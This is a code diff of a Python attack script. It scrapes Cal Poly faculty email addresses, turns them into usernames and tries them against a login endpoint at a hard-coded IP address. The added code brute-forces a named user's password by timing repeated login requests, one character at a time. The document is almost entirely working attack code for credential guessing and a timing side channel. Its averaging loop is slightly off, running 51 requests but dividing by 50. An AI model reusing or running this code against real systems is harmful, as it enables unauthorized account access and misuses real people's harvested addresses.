@@ -1,17 +1,24 @@
+import csv
+import string
 import re
 import requests
 from bs4 import BeautifulSoup
+from datetime import datetime
+import time 
+
 
 
 url = 'https://csc.calpoly.edu/faculty/'
 
 curl_url = "http://129.65.51.244:5000/login"
-def curl_request(username):
+possible_characters = list(string.ascii_lowercase + string.ascii_uppercase + string.punctuation)
+
+def curl_request(username, password):
     
 # Data to send in the POST request
     data = {
         "user": username,
-        "password": "PasswordHere"
+        "password": password
     }
 
 # Send the POST request
@@ -52,18 +59,50 @@ def scrap(url):
 # Sort and filter emails (optional step for clean output)
     filtered_emails = sorted(email for email in unique_emails if '@' in email and '.' in email)
     return filtered_emails
-
-filtered_emails = scrap(url)    
-username_list = []
+def username():
+    filtered_emails = scrap(url)    
+    username_list = []
 # Print the cleaned email addresses
-for email in filtered_emails:
-    if email.endswith('@calpoly.edu'):
-        email = email.replace('@calpoly.edu', '')
-        username_list.append(email)
+    for email in filtered_emails:
+        if email.endswith('@calpoly.edu'):
+            email = email.replace('@calpoly.edu', '')
+            username_list.append(email)
 
-for username in username_list:
-    creds = curl_request(username)
-    if (creds):
-        print(creds)
-        break
+    for username in username_list:
+        creds = curl_request(username, "hello")
+        if (creds):
+            print(creds)
+            break
 
+def bruteforce(username):
+
+    best_password = "" 
+    best_character = ""
+    max_time = 0
+    for character in possible_characters:
+        
+        password = ""
+        highest_time = 0
+        password += character
+        password += character
+        average_time = 0
+        for i in range(0,51):
+
+            start_time = time.time()
+            curl_request(username, password)
+            end_time = time.time()
+            duration = end_time - start_time
+            average_time +=duration
+
+        average_time = average_time / 50
+        
+        if average_time > max_time:
+            max_time = average_time
+            best_character = character
+
+            print(best_character)
+
+def main():
+    bruteforce("ayaank")
+if __name__ == "__main__":
+    main()
